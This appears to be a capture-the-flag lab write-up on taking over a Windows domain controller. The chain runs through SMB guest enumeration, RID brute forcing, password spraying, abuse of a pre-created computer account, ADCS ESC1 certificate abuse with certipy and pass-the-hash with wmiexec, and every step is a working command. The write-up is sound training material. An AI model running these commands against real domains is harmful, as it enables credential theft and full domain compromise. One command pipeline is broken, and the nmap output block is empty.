## Nmap

Using nmap we can scan the machine to understand which ports/services are open
```sql
nmap -sC -sV -T4 -oN nmap.txt 10.10.81.246
```

After getting results we can see ports/services on the host
```sql

```
So, it is a DC and has **dc.retro.vl** full name. We should add it to **/etc/hosts** file.

Also, we can see that in that host running **kerberos**, **smb**, **ldap** and **rdp**.


## SMB Enum

Now we can start from enumeration of **smb**.\
Using **netexec** we can enumerate shares.

```sql
netexec smb dc -u '' -p '' --shares
```

![](image-2.png)

\
As you can see we can perform **null authenticating**, but we can not access to the shares.\
Instead of we can try to use **guest** user (without password)


```sql
netexec smb dc -u 'guest' -p '' --shares
```
![](image-3.png)

\
Now we can enumerate the shares. There are possible methods:
- Using netexec's **spider_plus** module;
- Using impacket's **smbclient** script;
- Using general **smbclient** tool.

Let's try with impacket-smbclient.
```sql
impacket-smbclient retro.vl/guest@dc -no-pass
```
![](image-4.png)

\
Inside **Trainees** share we found Important.txt file. It is a message from admins.

## Users List Dump

Now let's try to dump list of users and try to spray usersnames as passwords. Maybe if we are lucky we will get a hit.
\
Using **--users** option of netexec does not give anything
```sql
netexec smb dc -u 'guest' -p '' --users
```
![](image-5.png)

\
But, there is another method, which is **bruting RIDs**. Netexec hash a option **--rid-brute maxRidValue.** Let's try to use it.

```sql
netexec smb dc -u 'guest' -p '' --rid-brute 10000
```

![](image-6.png)

\
Now we have a list of users, groups and aliasses. We need to geet a list users and we can use that command to get grep only users.
```sql
echo 'Content' | | cut -d '\' -f2 | cut -f1 -d ' '
```

After getting the usernames lists we can perform spraying usernames.\
In netexec just use users list as username and password.

```sql
netexec smb dc -u users.txt -p users.txt --continue-on-success --no-bruteforce
```
![](image-7.png)

\
We have one hit. User trainee has password trainee. So, it is time to enumerate using trainee user.

```sql
netexec smb dc -u trainee -p trainee --shares
```
![](image-8.png)


\
Trainee user has READ permissions for Notes share, which is interesting. Let's check using impacket-smbclient.

```sql
impacket-smbclient retro.vl/trainee:trainee@dc
```
![](image-9.png)

\
In the Notes share we see the ToDo.txt file. After reading it we can understand that there was an incident. Also, James talked about pre created computer account which sounds interesting. 


## Diving to pre created computer account
After some enumeration I found a post from [trustedsec](https://trustedsec.com/blog/diving-into-pre-created-computer-accounts). After reading that post I found interesting that for the pre created computer account used password as the name of the pre created computer account. For example we have a computer account banking$, what if we will try to use the password banking. So, let's try.

```sql
netexec smb dc -u banking$ -p banking
```
![](image-10.png)


\
Nice!\
We got an error **STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT** not like login failure or something like that. But how it can help us? 


## ADCS 

After a little bit enum, I found the **adcs** module of netexec.

```sql
netexec ldap dc -u trainee -p trainee -M adcs
```

![](image-11.png)

\
Interesting. We have ADCS on the DC. So, we can use **certipy** to get some information about the certificate center and maybe get some vulnerable templates.

```sql
certipy find -u trainee@retro.vl -p trainee -target dc.retro.vl -enabled -stdout -vulnerable
```
![](image-12.png)


\
And we found a vulnerable template and only **Domain Computers** can enroll it. So it is **ESC1**. After reading about **ESC1** from certipy's [github page](https://github.com/ly4k/Certipy?tab=readme-ov-file#esc1) I understand that we can request a certificate using **-ca (Certificate Authority)**, **-template (Template name)** and **-upn (Alternative UPN)** (for me upn sounds like impersonation).


## Exploitation of ESC1

Using certipy let's ask a certifcate and for the upn let's use Domain Administrator user.
```sql
certipy req -u 'banking$'@retro.vl -p banking -ca retro-DC-CA -template RetroClients -upn Administrator -target dc.retro.vl -key-size 4096
```
![](image-13.png)

\
But we saw an error **rpc_s_access_denied** which is similiar to netexec error for banking$ authentication.\
The best options is just ask a TGT (Ticket Granting Ticket) ticket to banking$ user and using kerberos just perform ESC1 attack.

```sql
impacket-getTGT retro.vl/banking$:banking -dc-ip dc
```

![](image-14.png)


\
Awesome we got a tgt ticket and now it is time to back ESC1. But before we need to set a **KRB5CCNAME** local environment variable and use path to tgt (banking$.ccache) file.

```sql
export KRB5CCNAME=banking\$.ccache
```

```sql
certipy req -u 'banking$'@retro.vl -k -no-pass -ca retro-DC-CA -template RetroClients -upn Administrator -target dc.retro.vl -key-size 4096
```
![](image-15.png)


\
Boom! We got a certificate of Administrator user. To get a **ntlm** hash of that user we need to use **auth** module of certipy.

```sql
certipy auth -pfx administrator.pfx -domain retro.vl
```

![](image-16.png)

\
Awesome! Now we have a nt hash of domain Administrator, and we can just use psexec or wmiexec to read the flags
```sql
impacket-wmiexec retro.vl/Administrator@dc -hashes :252fac7066d93dd009d4fd2cd0368389
```
